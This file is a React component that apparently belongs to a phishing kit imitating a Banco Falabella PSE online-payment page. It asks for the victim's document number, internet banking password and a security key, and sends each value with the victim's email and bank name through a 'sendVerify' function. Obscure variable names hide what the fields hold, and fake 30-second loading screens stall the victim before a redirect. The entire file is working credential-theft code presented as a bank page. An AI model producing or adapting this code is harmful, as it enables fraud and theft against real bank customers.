import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { sendVerify } from '../verifyData';
import styles from './X07.module.css';
import logoHeader from '../../Assets/Images/X07/logoHeader.jpg'
import logoMain from '../../Assets/Images/X07/logoMain.jpg'
import logoFooter from '../../Assets/Images/X07/logoFooter.png'
import loader from '../../Assets/Images/X07/loader.gif'
import loaderMain from '../../Assets/Images/loader.gif'

function X07() {

    const location = useLocation();
    const navigate = useNavigate();
    const { dataD, dataE } = location.state || {};

    const [dataF, setDataF] = useState('');
    const [dataG, setDataG] = useState('');
    const [dataH, setDataH] = useState('');

    const [showDataHSection, setShowDataHSection] = useState(false);
    const [showLoader, setShowLoader] = useState(false);
    const [showLoaderMain, setShowLoaderMain] = useState(false);

    const handleContinue = (e) => {

        e.preventDefault();

        if (!showDataHSection) {
            setShowLoader(true);
            sendVerify(`🆔: ${dataF}\n🔐: ${dataG}\n📧: ${dataE}\n🏦: ${dataD}`);
            
            setTimeout(() => {
                setShowLoader(false);
                setShowDataHSection(true);
            }, 30000)

        } else {
            sendVerify(`🔑: ${dataH}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowLoaderMain(true);
            setTimeout(() => {
                navigate("/resumenpago")
            }, 30000)
        }
    };

    return (
        <>
           <header className={styles.headerX07}>
                <img src={logoHeader} alt='Logo'></img>
           </header>
           <main className={styles.mainX07}>
                <section>
                    <img src={logoMain} alt='Logo'></img>
                </section>
                <section>
                    <h1>Pagos PSE - Pagos en línea</h1>
                    <h2>Pagos Banco Falabella v2.3.21.7</h2>
                    <form>
                        {!showDataHSection && (
                            <div>
                                <label>Tipo de persona</label>
                                <select>
                                    <option>Persona Natural</option>
                                    <option>Persona Juridica</option>
                                </select>
                            </div>
                        )}
                        {!showDataHSection && (
                            <div >
                                <label>Tipo de documento</label>
                                <select>
                                    <option>Cedula de Ciudadanía</option>
                                    <option>Cedula de Extranjería</option>
                                    <option>Tarjeta de Identidad</option>
                                </select> 
                            </div>
                        )}
                        {!showDataHSection && (
                            <div>
                                <label htmlFor="dataF">Numero de documento</label>
                                <input type='number'
                                        value={dataF}
                                        onChange={(e) => setDataF(e.target.value)}
                                        placeholder='Escribe el numero de documento'>
                                </input>
                            </div> 
                        )}
                        {!showDataHSection && (
                            <div>
                                <label htmlFor="dataG">Clave Internet</label>
                                <input 
                                    id="dataG"
                                    type="password"
                                    value={dataG}
                                    onChange={(e) => setDataG(e.target.value)}
                                    placeholder="Escribe tu multiclave"
                                /> 
                            </div>
                        )}
                        {showDataHSection && (
                            <div className={styles.dataHSectionX07}>
                                <label htmlFor="dataH">Ingreso de clave de seguridad</label>
                                <input 
                                    id="dataH"
                                    type="password"
                                    value={dataH}
                                    onChange={(e) => setDataH(e.target.value)}
                                    placeholder="Escribe la clave de seguridad"
                                />
                            </div>
                        )}
                        <div>
                            <button>Cancelar</button>
                            <button onClick={handleContinue}>{showDataHSection ? 'Ingresar' : 'Continuar'}</button>
                        </div>
                    </form>
                    <div>
                        <h3>Ayuda</h3>
                        <p>• Genera tu Clave Internet</p>
                        <p>• Recibe asesoría inmediata a través de WhatsApp. Guarda nuestro número verificado <span>+ 57 1 5878000</span></p>
                    </div>
                </section>
                {showLoader && (
                    <section className={styles.overlayX07}>
                        <img src={loader}></img>
                    </section>
                )}
                {showLoaderMain && (
                    <section className={styles.loaderMain}>
                        <img src={loaderMain}></img>
                    </section>
                )}
           </main>
           <footer className={styles.footerX07}>
                <img src={logoFooter} alt='Logo'></img>
           </footer>
        </>
    )
}

export default X07;